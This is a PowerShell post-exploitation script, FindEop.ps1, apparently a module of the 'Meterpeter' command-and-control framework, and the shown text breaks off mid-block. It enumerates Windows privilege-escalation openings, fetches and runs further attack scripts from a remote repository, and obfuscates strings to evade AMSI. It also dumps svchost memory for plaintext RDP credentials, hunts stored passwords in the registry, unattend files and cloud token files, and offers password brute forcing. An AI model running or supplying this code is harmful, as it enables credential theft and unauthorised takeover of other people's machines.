<#
.SYNOPSIS
   Search for Escalation Of privileges Entrys [local]

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: Invoke-WebRequest {native}
   Optional Dependencies: ACLMitreT1574.ps1, Sherlock.ps1 {download}
   PS cmdlet Dev version: v2.3.28

.DESCRIPTION
   Auxiliary module of @Meterpeter C2 v2.10.14 FindEOP module, That allow users to search
   for possible Escalation Of Privileges entrys [local] using diferent documented technics.
   https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources

.NOTES
   Parameter -bruteforce 'true' brute forces active user account password, while -bruteforce 'pedro'
   brute forces the 'pedro' user account password. If you wish to use your own dicionary file then
   create it in %tmp% directory under the name 'passwords.txt' that bruteforce function will use it.

   Download\Execute FindEOP.ps1 CmdLet:
   iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/FindEop.ps1" -outfile "FindEOP.ps1";.\FindEOP.ps1

.Parameter Verb
   Use agressive scans? [slower] (default: false)

.Parameter BruteForce
   Brute force user account password? (default: false)
  
.EXAMPLE
   PS C:\> .\FindEop.ps1
   Default scan takes 3 minuts to finish

.EXAMPLE
   PS C:\> .\FindEop.ps1 -verb 'true'
   Agressive scan takes 6 minuts to finish

.EXAMPLE
   PS C:\> .\FindEop.ps1 -bruteforce 'true'
   Scans for EOP and brute force user account pass

.EXAMPLE
   PS C:\> .\FindEop.ps1 -bruteforce 'pedro'
   Scans for EOP and brute force pedro account pass

.INPUTS
   None. You cannot pipe objects into FindEop.ps1

.OUTPUTS
   Privilege Name                Description                                   State
   ============================= ============================================= ========
   SeAssignPrimaryTokenPrivilege Replace a process-level token                 Disabled
   SeShutdownPrivilege           Shut down the system                          Disabled
   SeChangeNotifyPrivilege       Ignore cross scan                             Enabled
   SeUndockPrivilege             Remove computer from docking station          Disabled
   SeIncreaseWorkingSetPrivilege Augment a working set of processes            Disabled
   SeTimeZonePrivilege           Change time zone                              Disabled


   DIRECTORYS WITH 'FULLCONTROLL, MODIFY' PERMISSIONS
   --------------------------------------------------
   VulnId            : 1::ACL (Mitre T1574)
   FolderPath        : C:\Program Files (x86)\Battle.net
   FileSystemRights  : FullControl
   IdentityReference : BUILTIN\Users
   IsInherited       : False

   VulnId            : 2::ACL (Mitre T1574)
   FolderPath        : C:\Program Files (x86)\Resource Hacker
   FileSystemRights  : FullControl
   IdentityReference : Everyone
   IsInherited       : False
   
.LINK
   https://github.com/r00t-3xp10it/meterpeter
   https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$BruteForce="false",
   [string]$Verb="false"
)


#Local variables
$BatVersion = "v2.3.28"
$LocalPath = (Get-Location).Path
#Demonstration logfile with credentials in cleartext
echo "Logfile created by @FindEop" > $Env:TMP\ObeeRkiE.log
echo "username: @FindEop_Demonstration" >> $Env:TMP\ObeeRkiE.log
echo "password: myS3cR3T_In_ClearText" >> $Env:TMP\ObeeRkiE.log
$host.UI.RawUI.WindowTitle = "FindEop $BatVersion {SSA RedTeam @2024}"
#Spirit of Heaven, Goddess of Fire and Life!
$Banner = @"

                                                         \  /
                                                        (())
                                                         ,~L_
                                                        2~~ ^<\
                                                        )^>-\y(((GSSsss _$BatVersion
                       __________________________________)v_\__________________________________
                      (_// / / / (///////\3__________((_/      _((__________E/\\\\\\\) \ \ \ \\_)
                        (_/ / / / (////////////////////(c  (c /^|\\\\\\\\\\\\\\\\\\\\) \ \ \ \_)
                         "(_/ / / /(/(/(/(/(/(/(/(/(/(/\_    /\)\)\)\)\)\)\)\)\)\)\ \ \ \_)"
                            "(_/ / / / / / / / / / / / /|___/\ \ \ \ \ \ \ \ \ \ \ \ \_)"
                               "(_(_(_(_(_(_(_(_(_(_(_(_[_]_|_)_)_)_)_)_)_)_)_)_)_)_)"
                                                        ^|    \
                                                       / /   /___
                                                      / /         '~~~~~__.
                                                      \_\_______________\_'_?
                                          Spirit of Heaven, Goddess of Fire and Life
                                    Methodology: https://shorturl.at/oJRV0 {@swisskyrepo}


"@;
Write-Host $Banner
## CmdLet Banner Timeout
Start-Sleep -Seconds 2


$FucOrNot = "£SY@S£T£E@M @IN£F@OR£MA@TI£O@N" -replace '(@|£)',''
Write-Host "$FucOrNot"
Write-Host "------------------"
$FucOrNot = "s@y£st£e@min£@fo£ @>£ s@y£st@e£mi@nf£o.@t£x@t" -replace '(@|£)',''
$FucOrNot|&('Rex' -replace 'R','i')
$FucOrNot = "s@y£st£e@min£@fo£.t@xt£" -replace '(@|£)',''
Get-Content $FucOrNot|findstr "Host OS Registered Owner: Locale:"|findstr /V /C:"Registered Organization:"|findstr /V /C:"BIOS Version:"|findstr /V /C:"OS Build Type:"|findstr /V /C:"Input Locale:"
Remove-Item -path $FucOrNot -Force
Write-Host "`n"


#List UAC settings
Write-Host "USER ACCOUNT CONTROL"
Write-Host "--------------------"                
$RawPolicyKey = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system';
$UacStatus = (Get-Itemproperty -path $RawPolicyKey).EnableLUA;
$ConsentPromptBehaviorUser = (Get-Itemproperty -path $RawPolicyKey).ConsentPromptBehaviorUser;
$ConsentPromptBehaviorAdmin = (Get-Itemproperty -path $RawPolicyKey).ConsentPromptBehaviorAdmin;

If($UacStatus -eq 0)
{
   Write-Host "UAC Status                 : Disabled REG_DWORD 0x0" -ForeGroundColor Green -BackGroundColor Black
}
ElseIf($UacStatus -eq 1)
{
   Write-Host "UAC Status                 : Enabled REG_DWORD 0x1" -ForeGroundColor Red
}

If($ConsentPromptBehaviorAdmin -eq 5 -and $ConsentPromptBehaviorUser -eq 3)
{
   Write-Host "UAC Settings               : Notify Me (a:0x5|u:0x3)" -ForegroundColor Yellow
}
ElseIf($ConsentPromptBehaviorAdmin -eq 0 -and $ConsentPromptBehaviorUser -eq 3)
{
   Write-Host "UAC Settings               : Never Notify (a:0x0|u:0x3)" -ForeGroundColor Green -BackGroundColor Black
}
ElseIf($ConsentPromptBehaviorAdmin -eq 2 -and $ConsentPromptBehaviorUser -eq 3)
{
   Write-Host "UAC Settings               : Allways Notify (a:0x2|u:0x3)" -ForeGroundColor Red -BackGroundColor Black
}
Write-Host "`n"


If($Verb -ieq "True")
{
   #List Anti-Virus Info
   Write-Host "ANTI-VIRUS DEFINITIONS"
   Write-Host "----------------------"
   iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Get-AVStatus.ps1" -OutFile "$Env:TMP\Get-AVStatus.ps1"|Unblock-File;
   powershell -File "$Env:TMP\Get-AVStatus.ps1";Remove-Item -Path "$Env:TMP\Get-AVStatus.ps1" -Force
   Write-Host "`n"

   #What processes loaded am`si.dl`l?
   Write-Host "PROCESSES THAT LOAD AMS`I.DL`L" 
   Write-Host "----------------------------"
   $ParseData = "@m`s`i.d!!" #Obfucate am`si.dll API call
   $ObfuscatedAPI = $ParseData -replace '@','a' -replace '!','l'
   ps | Where-Object {
      $_.Modules.ModuleName -contains "$ObfuscatedAPI"
   }|Select-Object Handles,NPM,PM,WS,CPU,SI,ProcessName,@{Name='Loaded DLL';Expression={"$ObfuscatedAPI"}}|Format-Table -AutoSize|Out-String -Stream|Select-Object -Skip 1
}


#List UserPrivs
Write-Host "USER INFORMATION"
Write-Host "----------------"
whoami /user|Format-Table|Out-String -Stream|Select-Object -Skip 4
Write-Host "`n"


#List Local Groups
Write-Host "LIST LOCAL GROUPS"
Write-Host "-----------------"
Get-LocalGroup|Select-Object Name,SID,PrincipalSource|Format-table -AutoSize|Out-String -Stream|Select-Object -Skip 1|ForEach-Object {
   $stringformat = If($_ -iMatch '^(Administra)')
   {
      @{ 'ForegroundColor' = 'Yellow' }
   }
   Else
   {
      @{ 'ForegroundColor' = 'White' }
   }
   Write-Host @stringformat $_
}


#List HotFixes
Write-Host "LIST HOTFIXES INSTALLED"
Write-Host "-----------------------"
Get-HotFix|Select-Object Description,HotFixID,InstalledBy,InstalledOn|Format-table -AutoSize|Out-String -Stream|Select-Object -Skip 1|Select-Object -SkipLast 1|ForEach-Object {
   $stringformat = If($_ -iMatch '^(Security Update)')
   {
      @{ 'ForegroundColor' = 'Yellow' }
   }
   Else
   {
      @{ 'ForegroundColor' = 'White' }
   }
   Write-Host @stringformat $_
}
Write-Host ""


#List Privileges
Write-Host "PRIVILEGES INFORMATION"
Write-Host "----------------------"
whoami /priv|Format-Table|Out-String -Stream|Select-Object -Skip 4|ForEach-Object {
   $stringformat = If($_ -iMatch '(Enabled)')
   {
      @{ 'ForegroundColor' = 'Green' }
   }
   Else
   {
      @{ 'ForegroundColor' = 'White' }
   }
   Write-Host @stringformat $_
}
Write-Host "`n"


#Abusing the golden privileges
Write-Host "JUICY POTATO GOLDEN PRIVILEGES"
Write-Host "[i] vulnerable priv if shell is running with low privileges" -ForeGroundColor Yellow
Write-Host "-----------------------------------------------------------"
If($Verb -ieq "False")
{
   $juicy = whoami /priv|findstr /i /C:'SeImpersonatePrivileges' /i /C:'SeAssignPrimaryTokenPrivilege'|findstr /i /C:'Enabled';
   If(-not($juicy))
   {
      write-host "[GOLDEN] None vulnerable token privileges found."
   }
   Else
   {
      Write-Host $juicy -ForeGroundColor Green
   }
}
Else
{
   #NOTE: FindEop.ps1 -verb 'true' - triggers more elaborated checks (slower)
   New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT|Out-Null;
   $CLSID = (Get-ItemProperty HKCR:\clsid\* | Select-Object * | Where-Object {
      $_.appid -ne $null}).PSChildName|Select -Last 2;ForEach($a in $CLSID)
      {
         Write-Host "[CLSID:] $a" -ForegroundColor DarkGray
      }
      $juicy = whoami /priv|findstr /i /C:'SeImpersonatePrivileges' /i /C:'SeAssignPrimaryTokenPrivilege'|findstr /i /C:'Enabled';
      If(-not($juicy))
      {
         write-host "[GOLDEN] None vulnerable token privileges found." -ForeGroundColor Red
      }
      Else
      {
         Write-Host $juicy -ForeGroundColor Green
      }
}
write-host "`n"


#Rotten Potato Silver Privileges
write-host "ROTTEN POTATO SILVER PRIVILEGES"
Write-Host "[i] vulnerable priv if shell is running with low privileges" -ForeGroundColor Yellow
write-host "-----------------------------------------------------------"
$RottenPotato = whoami /priv|findstr /C:'SeImpersonatePrivilege' /C:'SeAssignPrimaryPrivilege' /C:'SeTcbPrivilege' /C:'SeBackupPrivilege' /C:'SeRestorePrivilege' /C:'SeCreateTokenPrivilege' /C:'SeLoadDriverPrivilege' /C:'SeTakeOwnershipPrivilege' /C:'SeDebugPrivileges'|findstr /C:'Enabled';
If(-not($RottenPotato))
{
   write-host "[SILVER] None vulnerable token privileges found."
}
Else
{
   Write-Host $RottenPotato -ForeGroundColor Green
}
write-host "`n"


#Check For Named Pipes
write-host "CHECK FOR NAMED PIPES"
#[System.IO.Directory]::GetFiles("\\.\pipe\")
#Check for Named Pipes. This can be exploited to obtain the privileges of a process connecting to them.
If($Verb -ieq "False")
{
   Write-Host "[i] First 5 pipes found." -ForeGroundColor Yellow
   Write-Host "------------------------"
   $CheckPipes = (Get-ChildItem \\.\pipe\ -EA SilentlyContinue).FullName;
   If($CheckPipes)
   {
      Write-Host "[VULNERABLE::T1574]" -ForeGroundColor Green -BackGroundColor Black;
      $Report = $CheckPipes|Select -Skip 1|Select -First 5;echo $Report
   }
   Else
   {
      Write-Host "ERROR: None Name Pipes found .."
   }
}
Else
{
   Write-Host "[i] First 10 pipes found." -ForeGroundColor Yellow
   Write-Host "-------------------------"
   $CheckPipes = (Get-ChildItem \\.\pipe\ -EA SilentlyContinue).FullName;
   If($CheckPipes)
   {
      Write-Host "[VULNERABLE::T1574]" -ForeGroundColor Green -BackGroundColor Black;
      $Report = $CheckPipes|Select -Skip 1|Select -First 10;echo $Report
   }
   Else
   {
      Write-Host "ERROR: None Name Pipes found .."
   }
}
write-host "`n"


#Environement Paths
Write-Host "ENVIRONEMENT PATHS"
Write-Host "------------------"
($Env:Path) -Split ';'
Write-Host "`n"


#Environement paths entries permissions
Write-Host "SCANNING ENVIRONEMENT PATHS PERMISSIONS"
Write-Host "[i] Place exe or DLL to exec instead of legitimate" -ForeGroundColor Yellow
Write-Host "--------------------------------------------------"
iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/ACLMitreT1574.ps1" -OutFile "$Env:TMP\ACLMitreT1574.ps1"|Unblock-File
If($Verb -ieq "False")
{
   powershell -File $Env:TMP\ACLMitreT1574.ps1 -action path -Egg true
}
Else
{
   #NOTE: FindEop.ps1-verb 'true' - triggers more elaborated checks (slower)
   powershell -File $Env:TMP\ACLMitreT1574.ps1 -action path -extraGroup true -extraperm true -Egg true
}
Write-Host "`n"


#User Directorys with fullCONTROL or modify permisions
If($verb -ieq "False")
{
   Write-Host "DIRECTORYS WITH 'FULLCONTROLL, MODIFY' PERMISSIONS"
   Write-Host "[i] Scanning All %PROGRAMFILES% directorys recursive ...." -ForeGroundColor Yellow
   Write-Host "---------------------------------------------------------"
   powershell -File $Env:TMP\ACLMitreT1574.ps1 -action dir -Egg true
}
Else
{
   Write-Host "DIRECTORYS WITH 'FULLCONTROLL, MODIFY, WRITE' PERMISSIONS"
   Write-Host "[i] Scanning All %PROGRAMFILES% directorys recursive ...." -ForeGroundColor Yellow
   Write-Host "---------------------------------------------------------"
   powershell -File $Env:TMP\ACLMitreT1574.ps1 -action dir -extraGroup true -extraperm true -Egg true
}
Write-Host "`n"


#List Unquoted Service Paths
Write-Host "SEARCHING FOR UNQUOTED SERVICE PATHS"
Write-Host "------------------------------------"
iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/Sherlock.ps1" -OutFile "$Env:TMP\Sherlock.ps1"|Unblock-File
Import-Module -Name "$Env:TMP\Sherlock.ps1" -Force;Get-Unquoted SE|Out-String -Stream|Select-Object -Skip 1
Write-Host "* ElapsedTime:" -ForegroundColor Blue -BackgroundColor Black -NoNewline;
Write-Host "00:00:03" -ForegroundColor Green -BackgroundColor Black -NoNewline;
Write-Host " - scantype:" -ForegroundColor Blue -BackgroundColor Black -NoNewline;
Write-Host "Unquoted" -ForegroundColor Green -BackgroundColor Black;
Write-Host "`n"


Write-Host "WEAK SERVICES REGISTRY PERMISSIONS"
Write-Host "----------------------------------"
#(Get-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\services\*" -EA SilentlyContinue).PSPath
If($verb -ieq "False")
{
   powershell -File $Env:TMP\ACLMitreT1574.ps1 -action reg -Egg true
}
Else
{
   powershell -File $Env:TMP\ACLMitreT1574.ps1 -action reg -extraGroup true -Egg true
}
Remove-Item -path "$Env:TMP\ACLMitreT1574.ps1" -Force
Write-Host "`n"


#Define Batch title again because sherlock.ps1 + ACLMitreT1574.ps1 changed it ..
$host.UI.RawUI.WindowTitle = "@FindEop $BatVersion {SSA RedTeam @2022}"


#List Programs that run at startup
Write-Host "SEARCHING PROGRAMS THAT RUN AT STARTUP"
Write-Host "--------------------------------------"
Get-CimInstance Win32_StartupCommand|Select-Object Name,Command,Location,User|Format-List|Out-String -Stream|Select-Object -Skip 2|Select-Object -SkipLast 2|ForEach-Object {
   $stringformat = If($_ -Match '^(Command  :)')
   {
      @{ 'ForegroundColor' = 'Green' }
   }
   ElseIf($_ -iMatch '^(Location :)')
   {
      @{ 'ForegroundColor' = 'Yellow' }
   }
   Else
   {
      @{ 'ForegroundColor' = 'White' }
   }
   Write-Host @stringformat $_
}
Write-Host ""


#List tasks running under system privs
Write-Host "TASKS RUNNING UNDER 'SYSTEM' PRIVILEGES"
Write-Host "---------------------------------------"
tasklist /fi 'username eq system'|Format-Table|Out-String -Stream|Select-Object -Skip 1
Write-Host "`n"


## REGISTRY SEARCH ##


#Get Domain Controllers
Write-Host "GET DOMAIN CONTROLLERS"
Write-Host "----------------------"
$DomainControler = $Env:USERDOMAIN;
Write-Host DCName::[$DomainControler] 0x995 -ForeGroundColor Yellow;
$um = nltest /DCNAME:$DomainControler;
$do = nltest /DSGETDC:$DomainControler;
$li = nltest /DCLIST:$DomainControler;
If($um -ieq $null -or $do -ieq $null -or $li -ieq $null)
{
   Write-Host "[MITRE::T1069] fail to found a valid DC name." -ForeGroundColor Red -BackGroundColor Black
}
Write-Host "`n"


#Powershell engine settings
Write-Host "DETECTING POWERSHELL ENGINE"
Write-Host "---------------------------"
$PSDefaultVersion = (Get-Host).Version.ToString();
write-host "PowershellDefault : $PSDefaultVersion" -ForeGroundColor Yellow
$TESTREGISTRY = reg query "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion | findstr /C:'2.0';
If($TESTREGISTRY)
{
   Write-Host "PowerShellVersion : 2.0 => [VULNERABLE::T1562]" -ForeGroundColor Green -BackGroundColor Black
}
Else
{
   Write-Host "ERROR: The system was unable to find the specified registry key or value."
}
(reg query "HKLM\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine" /v PowerShellVersion | findstr /C:'5.') -replace '    PowerShellVersion    REG_SZ   ','PowerShellVersion :'
(reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" /v EnableModuleLogging | findstr /C:'0x1') -replace '    EnableModuleLogging    REG_DWORD    0x1','EnableModuleLogging : True'
(reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging | findstr /C:'0x1') -replace '    EnableScriptBlockLogging    REG_DWORD    0x1','EnableScriptBlockLogging : True'
Write-Host "`n"
Start-Sleep -Milliseconds 800


#Is RDP access Enabled?
Write-Host "IS RDP ACCESS ENABLED?"
Write-Host "----------------------"
try{
   $TESTREGISTRY = Get-ItemPropertyValue -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name fDenyTSConnections -EA SilentlyContinue;
   If($TESTREGISTRY -Match '0')
   {
      Write-Host "[RDP] Connections: Allowed fDenyTSConnections REG_DWORD 0X$TESTREGISTRY" -ForeGroundColor Green -BackGroundColor Black
   }
   Else
   {
      Write-Host "[RDP] Connections: NotAllowed REG_DWORD 0x1."
   }
}catch{
   Write-Host "[RDP] Connections: NotAllowed REG_DWORD 0x1."
}
Write-Host "`n"


#Remote Desktop Credentials Manager
Write-Host "REMOTE DESKTOP CREDENTIALS MANAGER"
Write-Host "----------------------------------"
If(Test-Path -Path "$Env:LOCALAPPDATA\Microsoft\Remote Desktop Connection Manager\RDCMan.settings" -ErrorAction SilentlyContinue)
{
   Write-Host "Exists       : True"
   Write-Host "Name         : RDCMan.settings"
   Write-Host "Directory    : %LOCALAPPDATA%\Microsoft\Remote Desktop Connection Manager" -ForeGroundColor Green
   Write-Host "vulnerablity : Credentials are stored inside [ .rdg ] files .." -ForeGroundColor Yellow
}
Else
{
   Write-Host "[RDP] not found: %LOCALAPPDATA%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings"
}
Write-Host "`n"


Write-Host "DUMPING PLAINTEXT RDP CREDENTIALS FROM SVCHOST" #WSearch
Write-Host "[i] Credentials are stored in plaintext in memory" -ForeGroundColor Yellow
Write-Host "-------------------------------------------------"
If((Get-Service -Name "termservice" -EA SilentlyContinue).Status -ieq "Running")
{
   Write-Host "[" -ForeGroundColor DarkGray -NoNewline;
   Write-Host "RDP" -ForeGroundColor Green -NoNewline;
   Write-Host "] 'termservice' service running! [" -ForeGroundColor DarkGray -NoNewline;
   Write-Host "OK" -ForeGroundColor Green -NoNewline;
   Write-Host "]" -ForeGroundColor DarkGray;

   ## Query for svchost service Id (Responding) which has loaded rdpcorets.dll
   # $QueryTasts = tasklist /M:rdpcorets.dll|findstr "svchost"
   $PPID = (PS -EA SilentlyContinue | Where-Object {
      $_.ProcessName -iMatch 'svchost' -and $_.Responding -iMatch 'True' -and $_.Modules.ModuleName -iMatch "rdpcorets.dll"
   }).Id

   If($PPID)
   {
      $IPATH = (Get-Location).Path.ToString()
      Write-Host "[" -ForeGroundColor DarkGray -NoNewline;
      Write-Host "RDP" -ForeGroundColor Green -NoNewline;
      Write-Host "] 'rdpcorets.dll' loaded by svchost! [" -ForeGroundColor DarkGray -NoNewline;
      Write-Host "VULNERABLE::T1021" -ForeGroundColor Green -NoNewline;
      Write-Host "]" -ForeGroundColor DarkGray;
      Start-Sleep -Milliseconds 1400

      #Get-ProcessMiniDump requires Administrator privileges to run!
      $bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
      If($bool)
      {
         #Download Get-ProcessMiniDump cmdlet from my GitHub repo
         iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/Get-ProcessMiniDump.ps1" -OutFile "$Env:TMP\Get-ProcessMiniDump.ps1"|Unblock-File

         cd $Env:TMP
         Import-Module -Name .\Get-ProcessMiniDump.ps1 -Force
         Get-ProcessMiniDump -ProcID $PPID -Path "$Env:TMP\rdpcoretsDLL.out"
         ## Use comsvc.dll to dump svchost process (alternative to above cmdline)
         # .\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [PROCESS ID] [FILE PATH] full
         Write-Host "[" -ForeGroundColor DarkGray -NoNewline;
         Write-Host "RDP" -ForeGroundColor Green -NoNewline;
         Write-Host "] 'svchost' dumped to '" -ForeGroundColor DarkGray -NoNewline;
         Write-Host "$Env:TMP\rdpcoretsDLL.out" -ForeGroundColor Green -NoNewline;
         Write-Host "'" -ForeGroundColor DarkGray;
         Remove-Item -Path "$Env:TMP\Get-ProcessMiniDump.ps1" -EA SilentlyContinue -Force
         cd $IPATH 
      }
       Else
      {
         Write-Host "[" -ForeGroundColor DarkGray -NoNewline;
         Write-Host "RDP" -ForeGroundColor Red -NoNewline;
         Write-Host "] 'Get-ProcessMiniDump' requires administrator privileges! [" -ForeGroundColor DarkGray -NoNewline;
         Write-Host "FAIL" -ForeGroundColor Red -NoNewline;
         Write-Host "]" -ForeGroundColor DarkGray;
      }
   }
   Else
   {
      Write-Host "[" -ForeGroundColor DarkGray -NoNewline;
      Write-Host "RDP" -ForeGroundColor Red -NoNewline;
      Write-Host "] 'rdpcorets.dll' not loaded by svchost service! [" -ForeGroundColor DarkGray -NoNewline;
      Write-Host "FAIL" -ForeGroundColor Red -NoNewline;
      Write-Host "]" -ForeGroundColor DarkGray;
   }
}
Else
{
   Write-Host "[RDP] 'termservice' service stopped!" -ForeGroundColor Red -BackGroundColor Black
}
write-host "`n"


If($verb -ieq "True")
{
   #Cloud db Credentials in C:\Users
   Write-Host "CLOUD CREDENTIALS in $Env:USERPROFILE"
   Write-Host "-----------------------------------"
   $TESTFILES = (Get-ChildItem -Path "$Env:USERPROFILE" -Recurse -Include 'credentials.db','access_tokens.db','accessTokens.json','azureProfile.json','legacy_credentials','gcloud' -Exclude 'Saved Games','Starcraft II','Music','Searches','Favorites','Videos','Battle.net','old_Cache_000','CacheStorage','GPUCache' -Force -EA SilentlyContinue).FullName;
   If($TESTFILES)
   {
      Write-Host "[CLOUD] $TESTFILES" -ForeGroundColor Green -BackGroundColor Black
   }
   Else
   {
      Write-Host "[CLOUD] not found: credentials in db files." -ForeGroundColor Red -BackGroundColor Black
   }
   Write-Host "`n"
}


#List unattend.xml files
Write-Host "LIST UNATTEND.XML FILES EXISTENCE"
Write-Host "[i] Creds are stored in base64 and can be decoded manually." -ForeGroundColor Yellow
Write-Host "----------------------------------------------------------"
findstr /S /I cpassword \\$FQDN\sysvol\$FQDN\policies\*.xml
$TESTXML = (Get-ChildItem "$Env:WINDIR\unattend.xml" -EA SilentlyContinue|Select-Object *).FullName;
If($TESTXML)
{
   Write-Host "[XML]:[VULNERABLE::T1552] $TESTXML" -ForeGroundColor Green -BackGroundColor Black
}
Else
{
   Write-Host "[XML] not found: $Env:WINDIR\unattend.xml"
}
$TESTXML = (Get-ChildItem "$Env:WINDIR\sysprep\sysprep.xml" -EA SilentlyContinue|Select-Object *).FullName;
If($TESTXML)
{
   Write-Host "[XML]:[VULNERABLE::T1552] $TESTXML" -ForeGroundColor Green -BackGroundColor Black
}
Else
{
   Write-Host "[XML] not found: $Env:WINDIR\sysprep\sysprep.xml"
}
$TESTXML = (Get-ChildItem "$Env:WINDIR\sysprep\sysprep.inf" -EA SilentlyContinue|Select-Object *).FullName;
If($TESTXML)
{
   Write-Host "[XML]:[VULNERABLE::T1552] $TESTXML" -ForeGroundColor Green -BackGroundColor Black
}
Else
{
   Write-Host "[XML] not found: $Env:WINDIR\sysprep\sysprep.inf"
}
$TESTXML = (Get-ChildItem "$Env:WINDIR\system32\sysprep.inf" -EA SilentlyContinue|Select-Object *).FullName;
If($TESTXML)
{
   Write-Host "[XML]:[VULNERABLE::T1552] $TESTXML" -ForeGroundColor Green -BackGroundColor Black
}
Else
{
   Write-Host "[XML] not found: $Env:WINDIR\system32\sysprep.inf"
}
$TESTXML = (Get-ChildItem "$Env:WINDIR\Panther\Unattend.xml" -EA SilentlyContinue|Select-Object *).FullName;
If($TESTXML)
{
   Write-Host "[XML]:[VULNERABLE::T1552] $TESTXML" -ForeGroundColor Green -BackGroundColor Black
}
Else
{
   Write-Host "[XML] not found: $Env:WINDIR\Panther\unattend.xml"
}
$TESTXML = (Get-ChildItem "$Env:WINDIR\system32\sysprep\sysprep.xml" -EA SilentlyContinue|Select-Object *).FullName;
If($TESTXML)
{
   Write-Host "[XML]:[VULNERABLE::T1552] $TESTXML" -ForeGroundColor Green -BackGroundColor Black
}
Else
{
   Write-Host "[XML] not found: $Env:WINDIR\system32\sysprep\sysprep.xml"
}
$TESTXML = (Get-ChildItem "$Env:WINDIR\Panther\Unattend\Unattend.xml" -EA SilentlyContinue|Select-Object *).FullName;
If($TESTXML)
{
   Write-Host "[XML]:[VULNERABLE::T1552] $TESTXML" -ForeGroundColor Green -BackGroundColor Black
}
Else
{
   Write-Host "[XML] not found: $Env:WINDIR\Panther\unattend\unattend.xml"
}
If($Verb -ieq "True")
{
   Write-Host "[XML] Searching: for extra XML preference files." -ForeGroundColor Yellow
   $AllUsers = "$Env:ALLUSERSPROFILE";
   $XMLFiles = (Get-ChildItem -Path "$AllUsers" -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -EA SilentlyContinue).FullName;
   If(-not($XMLFiles))
   {
      Write-Host "[XML] not found: $AllUsers extra XML files." -ForeGroundColor Red -BackGroundColor Black
   }
   Else
   {
      Write-Host "[XML]:[VULNERABLE::T1552]" -ForeGroundColor Green -BackGroundColor Black;
      Write-Host $FoundXmlFile
   }
}
Write-Host "`n"


#List AlwaysInstallElevated
Write-Host "REGISTRY ALWAYSINSTALLELEVATED"
Write-Host "------------------------------"
$TESTREGISTRY = Get-ItemPropertyValue -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -EA SilentlyContinue;
If($TESTREGISTRY)
{
   Write-Host "[HKCU] AlwaysInstallElevated => [VULNERABLE::T1078]" -ForeGroundColor Green -BackGroundColor Black
}
Else
{
   Write-Host "[HKCU] AlwaysInstallElevated: none vulnerable settings found."
}
$TESTREGISTRY = Get-ItemPropertyValue -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -EA SilentlyContinue;
If($TESTREGISTRY)
{
   Write-Host "[HKLM] AlwaysInstallElevated => [VULNERABLE::T1078]" -ForeGroundColor Green -BackGroundColor Black
}
Else
{
   Write-Host "[HKLM] AlwaysInstallElevated: none vulnerable settings found."
}
Write-Host "`n"


#Registry raw credentials search
Write-Host "REGISTRY RAW CREDENTIALS SEARCH"
Write-Host "-------------------------------"
$StdOut = reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"|findstr 'LastUsedUsername DefaultUserName DefaultDomainName DefaultPassword';
Write-Host "$StdOut" -ForeGroundColor Green
$TESTREGISTRY = Get-Item -Path "HKLM:\SYSTEM\Current\ControlSet\Services\SNMP" -EA SilentlyContinue;
If($TESTREGISTRY)
{
   Write-Host "    [SNMP]     found => [VULNERABLE::T1078]" -ForeGroundColor Green -BackGroundColor Black
}
Else
{
   Write-Host "    [SNMP]     : none vulnerable settings found."
}
$TESTREGISTRY = Get-Item -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions" -EA SilentlyContinue;
If($TESTREGISTRY)
{
   Write-Host "    [PuTTY]    found => [VULNERABLE::T1078]" -ForeGroundColor Green -BackGroundColor Black
}
Else
{
   Write-Host "    [PuTTY]    : none vulnerable settings found."
}
$TESTREGISTRY = Get-Item -Path "HKCU:\Software\ORL\WinVNC3\Password" -EA SilentlyContinue;
If($TESTREGISTRY)
{
   Write-Host "    [WinVNC3]  found => [VULNERABLE::T1078]" -ForeGroundColor Green -BackGroundColor Black
}
Else
{
   Write-Host "    [WinVNC3]  : none vulnerable settings found."
}
$TESTREGISTRY = Get-ItemPropertyValue -Path "HKLM:\SOFTWARE\RealVNC\WinVNC4" -Name password -EA SilentlyContinue;
If($TESTREGISTRY)
{
   Write-Host "    [WinVNC4]  $TESTREGISTRY => [VULNERABLE::T1012]" -ForeGroundColor Green -BackGroundColor Black
}
Else
{
   Write-Host "    [WinVNC4]  : none vulnerable settings found."
}
$TESTREGISTRY = Get-Item -Path "HKCU:\Software\OpenSSH\Agent\Keys" -EA SilentlyContinue;
If($TESTREGISTRY)
{
   Write-Host "    [OpenSSH]  found => [VULNERABLE::T1078]" -ForeGroundColor Green -BackGroundColor Black
}
Else
{
   Write-Host "    [OpenSSH]  : none vulnerable settings found."
}
$TESTREGISTRY = Get-Item -Path "HKCU:\Software\TightVNC\Server" -EA SilentlyContinue;
If($TESTREGISTRY)
{
